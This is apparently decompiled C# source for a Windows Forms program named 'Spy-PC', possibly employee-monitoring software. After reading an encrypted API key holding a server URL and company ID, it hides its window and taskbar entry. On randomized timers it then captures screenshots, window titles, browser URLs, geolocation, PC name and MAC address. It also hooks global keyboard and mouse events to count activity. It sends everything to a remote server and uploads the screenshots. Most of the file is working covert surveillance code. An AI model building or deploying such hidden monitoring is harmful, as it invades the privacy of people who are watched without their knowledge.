using System;
using System.ComponentModel;
using System.Device.Location;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using Gma.UserActivityMonitor;
using Spy_PC.Properties;

namespace Spy_PC;

public class OTS : Form
{
	public const int WM_NCLBUTTONDOWN = 161;

	public const int HT_CAPTION = 2;

	private string App_data_path = "";

	private string currentLocation = "";

	private AES_CryptoClass aesCrypto = new AES_CryptoClass();

	private ConfigrationSettings configSettings = ConfigrationSettings.Instance;

	private string url_string = "";

	private string company_id = "";

	private model mdl = new model();

	private bool disableChangeTab = true;

	private url_controller UC = new url_controller();

	private int timer_counter;

	private int screenshort = 30;

	private int log = 10;

	private int screenshort_counter;

	private int log_counter;

	private Random r = new Random();

	private int timer_restart_counter;

	private int keyboard_action;

	private int mouse_action;

	private int mouse_movement;

	private int key_action_time;

	private int mouse_movement_counter;

	private int mouse_Click_counter;

	private IContainer components;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private PictureBox pictureBox1;

	private Panel pnlTitle;

	private Label label1;

	private Label label2;

	private TextBox txtTimeNoxAPIKey;

	private Label label4;

	private Button btnLetsStart;

	private Button btnClose;

	private PictureBox ptcAPILoading;

	private Timer timer_StartSpy;

	private Timer timer_RestartSpy;

	public GlobalEventProvider globalEventProvider1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	public OTS()
	{
		InitializeComponent();
		App_data_path = Path.GetFullPath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\");
		((Control)pnlTitle).BringToFront();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		tabControl1.set_ItemSize(new Size(0, 1));
		tabControl1.set_SizeMode((TabSizeMode)2);
	}

	public void setDisplayToLogin()
	{
		disableChangeTab = false;
		tabControl1.set_SelectedIndex(1);
		disableChangeTab = true;
		url_string = configSettings.url;
		company_id = configSettings.company_id;
	}

	private void OTS_Load(object sender, EventArgs e)
	{
		try
		{
			if (File.Exists(App_data_path + "config.properties"))
			{
				string text = File.ReadLines(App_data_path + "config.properties").First();
				string text2 = aesCrypto.Decrypt(text).Trim();
				Console.WriteLine("API key: " + text);
				Console.WriteLine(text2);
				string[] array = text2.Split(new string[1] { "___" }, StringSplitOptions.None);
				bool flag = false;
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (Uri.TryCreate(text3, UriKind.Absolute, out var result) && result.Scheme == Uri.UriSchemeHttp)
					{
						flag = true;
						url_string = text3;
						user_login.URL = url_string;
						Console.WriteLine("This is URL : " + text3);
					}
					else
					{
						company_id = text3;
						Console.WriteLine(text3);
					}
				}
				if (flag)
				{
					StartSpy();
					Console.WriteLine("OTS settings are found...");
					((Form)this).set_ShowInTaskbar(false);
					((Control)this).set_Visible(false);
				}
				else
				{
					Console.WriteLine("OTS settings are not found...");
				}
			}
			else
			{
				Console.WriteLine("OTS settings are not found...");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception occurs: " + ex.Message);
		}
	}

	public string GetLocationProperty()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		GeoCoordinateWatcher val = new GeoCoordinateWatcher();
		val.TryStart(false, TimeSpan.FromMilliseconds(3000.0));
		GeoCoordinate location = val.get_Position().get_Location();
		if (!location.get_IsUnknown())
		{
			Console.WriteLine("Lat: {0}, Long: {1}", location.get_Latitude(), location.get_Longitude());
			return location.get_Latitude() + "," + location.get_Longitude();
		}
		Console.WriteLine("Unknown latitude and longitude.");
		return "";
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		if (!((Control)ptcAPILoading).get_Visible())
		{
			try
			{
				((Control)ptcAPILoading).set_Visible(true);
				if (((Control)txtTimeNoxAPIKey).get_Text().Trim() != "")
				{
					string text = aesCrypto.Decrypt(((Control)txtTimeNoxAPIKey).get_Text()).Trim();
					Console.WriteLine(text);
					string[] array = text.Split(new string[1] { "___" }, StringSplitOptions.None);
					foreach (string text2 in array)
					{
						if (Uri.TryCreate(text2, UriKind.Absolute, out var result) && result.Scheme == Uri.UriSchemeHttp)
						{
							url_string = text2;
							Console.WriteLine("This is URL : " + text2);
						}
						else
						{
							company_id = text2;
							Console.WriteLine(text2);
						}
					}
					if (mdl.IsConnectedToInternet())
					{
						configSettings.SetValues(((Control)txtTimeNoxAPIKey).get_Text().Trim());
						user_login.URL = url_string;
						StartSpy();
						((Form)this).set_Opacity(0.0);
						((Form)this).set_ShowInTaskbar(false);
					}
					else
					{
						Console.WriteLine("No internet access...");
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
			((Control)ptcAPILoading).set_Visible(false);
		}
		else
		{
			Console.WriteLine("Not going in first if");
		}
	}

	private void StartSpy()
	{
		timer_StartSpy.set_Enabled(true);
	}

	private void StopSpy()
	{
		timer_StartSpy.set_Enabled(false);
	}

	private void pnlTitle_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(((Control)this).get_Handle(), 161, 2, 0);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("Are you sure to close Spy-PC", "Spy-PC", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			Application.ExitThread();
		}
	}

	private void tabControl1_Selecting(object sender, TabControlCancelEventArgs e)
	{
		if (disableChangeTab)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void timer_StartSpy_Tick(object sender, EventArgs e)
	{
		try
		{
			if (mdl.IsConnectedToInternet())
			{
				timer_counter++;
				screenshort_counter++;
				log_counter++;
				key_action_time++;
				if (screenshort_counter == screenshort)
				{
					new Thread((ParameterizedThreadStart)delegate
					{
						RecordTask(screenshort: true);
					}).Start();
					screenshort = 50;
					try
					{
						r.Next(15, 45);
						screenshort = int.Parse(string.Concat(Math.Round(r.NextDouble() * 60.0))) + 15;
					}
					catch (Exception)
					{
					}
					screenshort_counter = 0;
				}
				if (log_counter == log)
				{
					new Thread((ParameterizedThreadStart)delegate
					{
						RecordTask(screenshort: false);
					}).Start();
					log = 20;
					try
					{
						r.Next(15, 45);
						log = int.Parse(string.Concat(Math.Round(r.NextDouble() * 60.0))) + 15;
					}
					catch (Exception)
					{
					}
					log_counter = 0;
				}
				Console.WriteLine(timer_counter);
			}
			else
			{
				timer_StartSpy.set_Enabled(false);
				timer_RestartSpy.set_Enabled(true);
				Console.WriteLine("No internet access...");
			}
		}
		catch (Exception ex3)
		{
			timer_StartSpy.set_Enabled(false);
			timer_RestartSpy.set_Enabled(true);
			Console.WriteLine("Exception occurs: " + ex3.Message);
		}
	}

	private void RecordTask(bool screenshort)
	{
		try
		{
			string text = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds.ToString();
			string text2 = null;
			string[] array = null;
			text2 = mdl.GetActiveWindowTitle();
			char[] separator = new char[1] { '-' };
			array = text2.Split(separator);
			string text3 = text2;
			if (array.Length > 1)
			{
				text3 = array[^1];
			}
			string stringToEscape = text2;
			bool flag = true;
			string text4 = "";
			string stringToEscape2 = "";
			text3 = text3.Trim();
			switch (text3)
			{
			default:
				flag = false;
				break;
			case "safari":
			case "Safari":
				text4 = "safari";
				break;
			case "Opera":
			case "opera":
				text4 = "opera";
				break;
			case "Mozilla Firefox":
			case "firefox":
				text4 = "firefox";
				break;
			case "Google Chrome":
			case "chrome":
				text4 = "chrome";
				break;
			case "Microsoft Edge":
			case "edge":
				text4 = "edge";
				break;
			case "Internet Exploere":
			case "IE":
				text4 = "ie";
				break;
			}
			if (flag)
			{
				stringToEscape2 = NativeBrowserController.getBrowserData(text4);
			}
			string text5 = "";
			string text6 = "";
			if (screenshort)
			{
				text5 = "yes";
				string tempPath = Path.GetTempPath();
				Console.WriteLine(tempPath);
				mdl.FullScreenshot(tempPath ?? "", text + ".png", ImageFormat.get_Png());
				text6 = tempPath + text + ".png";
				Console.WriteLine("Screenshort  path: " + text6);
			}
			else
			{
				text5 = "no";
			}
			string text7 = keyboard_action.ToString();
			string text8 = mouse_action.ToString();
			string text9 = mouse_movement.ToString();
			string text10 = key_action_time.ToString();
			string.Concat(timer_counter);
			string pC_Name = mdl.getPC_Name();
			string mACAddress = mdl.GetMACAddress2();
			currentLocation = GetLocationProperty();
			if (!mdl.IsConnectedToInternet())
			{
				return;
			}
			string json = "{\"current_dt\": \"" + text + "\",\"current_process\": \"" + HttpUtility.UrlEncode(Uri.EscapeDataString(text3)) + "\",\"current_window_title\": \"" + HttpUtility.UrlEncode(Uri.EscapeDataString(stringToEscape)) + "\",\"current_web\": \"" + text4 + "\",\"current_web_url\": \"" + HttpUtility.UrlEncode(Uri.EscapeDataString(stringToEscape2)) + "\",\"uploaded\": \"" + text5 + "\",\"keyboard_action\": \"" + text7 + "\",\"mouse_action\": \"" + text8 + "\",\"mouse_movement\": \"" + text9 + "\",\"key_action_time\": \"" + text10 + "\",\"location\": \"" + currentLocation + "\",\"pc_name\": \"" + pC_Name + "\",\"mac_address\": \"" + mACAddress + "\"} ";
			string text11 = "";
			try
			{
				text11 = mdl.PostDataToServer(UC.windows_task_detials_insert(), json);
				Console.WriteLine("Ouput>" + text11);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error in check login : " + ex.ToString());
			}
			key_action_time = 0;
			keyboard_action = 0;
			mouse_action = 0;
			mouse_movement = 0;
			string text12 = text11;
			string value = "true";
			int num = text12.IndexOf(value);
			Console.WriteLine("Char count : " + num);
			if (num > 0)
			{
				string text13 = "";
				text2 = text11;
				text13 = text2.Split(separator)[^2];
				if (text13 != "" && text5 == "yes")
				{
					byte[] array2 = new WebClient
					{
						Headers = { { "Content-Type", "binary/octet-stream" } }
					}.UploadFile(UC.windows_task_detials_insert() + "&mac_address=" + mACAddress + "&pc_name=" + pC_Name + "&image=true&image_id=" + text13, "POST", text6);
					string @string = Encoding.UTF8.GetString(array2, 0, array2.Length);
					Console.WriteLine("Image uploaded>>>> " + @string);
					try
					{
						File.Delete(text6);
						return;
					}
					catch (Exception ex2)
					{
						Console.WriteLine("Unable to delte image: " + ex2.Message);
						return;
					}
				}
			}
			else
			{
				Console.WriteLine("Data not sent to server....");
			}
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Unable to took log or screenshort");
			Console.WriteLine("Exception occurs: " + ex3.Message);
		}
	}

	private void timer_RestartSpy_Tick(object sender, EventArgs e)
	{
		Console.WriteLine("Trying.. to check internet..." + timer_restart_counter);
		if (mdl.IsConnectedToInternet())
		{
			timer_StartSpy.set_Enabled(true);
			timer_RestartSpy.set_Enabled(false);
		}
		else
		{
			timer_restart_counter++;
			Console.WriteLine(timer_restart_counter);
			Console.WriteLine("No internet connection found...");
		}
	}

	private async void HookManager_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private async void HookManager_KeyUp(object sender, KeyEventArgs e)
	{
	}

	private async void HookManager_KeyPress(object sender, KeyPressEventArgs e)
	{
		keyboard_action++;
		Console.WriteLine("keyboard_action" + keyboard_action);
	}

	private async void HookManager_MouseMove(object sender, MouseEventArgs e)
	{
		mouse_movement_counter++;
		if (mouse_movement_counter == 100)
		{
			mouse_movement++;
			mouse_movement_counter = 0;
			Console.WriteLine("mouse_movement" + mouse_movement);
		}
	}

	private async void HookManager_MouseClick(object sender, MouseEventArgs e)
	{
		mouse_Click_counter++;
		if (mouse_Click_counter == 3)
		{
			mouse_action++;
			mouse_Click_counter = 0;
			Console.WriteLine("mouse_action" + mouse_action);
		}
	}

	private async void HookManager_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private async void HookManager_MouseWheel(object sender, MouseEventArgs e)
	{
		mouse_action++;
	}

	private async void HookManager_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private async void HookManager_MouseDoubleClick(object sender, MouseEventArgs e)
	{
	}

	private void OTS_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_018e: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_03a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b1: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected O, but got Unknown
		//IL_047c: Unknown result type (might be due to invalid IL or missing references)
		//IL_061a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0624: Expected O, but got Unknown
		//IL_06bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c7: Expected O, but got Unknown
		//IL_073d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0747: Expected O, but got Unknown
		//IL_07fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0806: Expected O, but got Unknown
		//IL_0813: Unknown result type (might be due to invalid IL or missing references)
		//IL_081d: Expected O, but got Unknown
		//IL_082a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0834: Expected O, but got Unknown
		//IL_0841: Unknown result type (might be due to invalid IL or missing references)
		//IL_084b: Expected O, but got Unknown
		//IL_0858: Unknown result type (might be due to invalid IL or missing references)
		//IL_0862: Expected O, but got Unknown
		//IL_08e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f2: Expected O, but got Unknown
		components = new Container();
		pnlTitle = new Panel();
		btnClose = new Button();
		pictureBox1 = new PictureBox();
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		ptcAPILoading = new PictureBox();
		btnLetsStart = new Button();
		txtTimeNoxAPIKey = new TextBox();
		label4 = new Label();
		label2 = new Label();
		label1 = new Label();
		timer_StartSpy = new Timer(components);
		timer_RestartSpy = new Timer(components);
		globalEventProvider1 = new GlobalEventProvider();
		((Control)pnlTitle).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((ISupportInitialize)ptcAPILoading).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pnlTitle).get_Controls().Add((Control)(object)btnClose);
		((Control)pnlTitle).get_Controls().Add((Control)(object)pictureBox1);
		((Control)pnlTitle).set_Dock((DockStyle)1);
		((Control)pnlTitle).set_ImeMode((ImeMode)0);
		((Control)pnlTitle).set_Location(new Point(0, 0));
		((Control)pnlTitle).set_Name("pnlTitle");
		((Control)pnlTitle).set_Size(new Size(756, 39));
		((Control)pnlTitle).set_TabIndex(0);
		((Control)pnlTitle).add_MouseDown(new MouseEventHandler(pnlTitle_MouseDown));
		((Control)btnClose).set_Cursor(Cursors.get_Hand());
		((Control)btnClose).set_Dock((DockStyle)4);
		((ButtonBase)btnClose).get_FlatAppearance().set_BorderColor(SystemColors.Control);
		((ButtonBase)btnClose).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnClose).get_FlatAppearance().set_MouseDownBackColor(SystemColors.Control);
		((ButtonBase)btnClose).get_FlatAppearance().set_MouseOverBackColor(SystemColors.Control);
		((ButtonBase)btnClose).set_FlatStyle((FlatStyle)0);
		((ButtonBase)btnClose).set_Image((Image)(object)Resources.cross_icon);
		((Control)btnClose).set_Location(new Point(716, 0));
		((Control)btnClose).set_Name("btnClose");
		((Control)btnClose).set_Size(new Size(40, 39));
		((Control)btnClose).set_TabIndex(1);
		((Control)btnClose).set_TabStop(false);
		((ButtonBase)btnClose).set_UseVisualStyleBackColor(true);
		((Control)btnClose).add_Click((EventHandler)button2_Click);
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)2);
		((Control)pictureBox1).set_Dock((DockStyle)3);
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(178, 39));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_MouseDown(new MouseEventHandler(pnlTitle_MouseDown));
		((Control)tabControl1).set_Anchor((AnchorStyles)15);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).set_Location(new Point(4, 23));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(750, 400));
		((Control)tabControl1).set_TabIndex(1);
		tabControl1.add_SelectedIndexChanged((EventHandler)tabControl1_SelectedIndexChanged);
		tabControl1.add_Selecting(new TabControlCancelEventHandler(tabControl1_Selecting));
		((Control)tabPage1).get_Controls().Add((Control)(object)ptcAPILoading);
		((Control)tabPage1).get_Controls().Add((Control)(object)btnLetsStart);
		((Control)tabPage1).get_Controls().Add((Control)(object)txtTimeNoxAPIKey);
		((Control)tabPage1).get_Controls().Add((Control)(object)label4);
		((Control)tabPage1).get_Controls().Add((Control)(object)label2);
		((Control)tabPage1).get_Controls().Add((Control)(object)label1);
		((Control)tabPage1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(742, 374));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("tabPage1");
		tabPage1.set_UseVisualStyleBackColor(true);
		ptcAPILoading.set_Image((Image)(object)Resources.loading_login_new);
		((Control)ptcAPILoading).set_Location(new Point(326, 104));
		((Control)ptcAPILoading).set_Name("ptcAPILoading");
		((Control)ptcAPILoading).set_Size(new Size(51, 49));
		ptcAPILoading.set_TabIndex(3);
		ptcAPILoading.set_TabStop(false);
		((Control)ptcAPILoading).set_Visible(false);
		((Control)btnLetsStart).set_Location(new Point(62, 263));
		((Control)btnLetsStart).set_Name("btnLetsStart");
		((Control)btnLetsStart).set_Size(new Size(151, 30));
		((Control)btnLetsStart).set_TabIndex(2);
		((Control)btnLetsStart).set_Text("Let's Start");
		((ButtonBase)btnLetsStart).set_UseVisualStyleBackColor(true);
		((Control)btnLetsStart).add_Click((EventHandler)button1_Click);
		((Control)txtTimeNoxAPIKey).set_Location(new Point(62, 218));
		((Control)txtTimeNoxAPIKey).set_Name("txtTimeNoxAPIKey");
		((Control)txtTimeNoxAPIKey).set_Size(new Size(607, 21));
		((Control)txtTimeNoxAPIKey).set_TabIndex(1);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Verdana", 7f));
		((Control)label4).set_ForeColor(Color.FromArgb(204, 0, 0));
		((Control)label4).set_Location(new Point(60, 333));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(389, 12));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text("No Internet connection found. Please check your network connection.");
		((Control)label4).set_Visible(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Verdana", 8f));
		((Control)label2).set_Location(new Point(59, 196));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(134, 13));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("Enter Spy-PC API Key");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Verdana", 12f));
		((Control)label1).set_Location(new Point(196, 55));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(303, 18));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Spy-PC API Key Configuration Setup");
		timer_StartSpy.set_Interval(1000);
		timer_StartSpy.add_Tick((EventHandler)timer_StartSpy_Tick);
		timer_RestartSpy.set_Interval(10000);
		timer_RestartSpy.add_Tick((EventHandler)timer_RestartSpy_Tick);
		globalEventProvider1.MouseMove += new MouseEventHandler(HookManager_MouseMove);
		globalEventProvider1.MouseClick += new MouseEventHandler(HookManager_MouseClick);
		globalEventProvider1.MouseUp += new MouseEventHandler(HookManager_MouseUp);
		globalEventProvider1.MouseDoubleClick += new MouseEventHandler(HookManager_MouseDoubleClick);
		globalEventProvider1.KeyPress += new KeyPressEventHandler(HookManager_KeyPress);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(756, 424));
		((Control)this).get_Controls().Add((Control)(object)tabControl1);
		((Control)this).get_Controls().Add((Control)(object)pnlTitle);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("OTS");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Spy-PC");
		((Form)this).add_FormClosing(new FormClosingEventHandler(OTS_FormClosing));
		((Form)this).add_Load((EventHandler)OTS_Load);
		((Control)pnlTitle).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage1).PerformLayout();
		((ISupportInitialize)ptcAPILoading).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
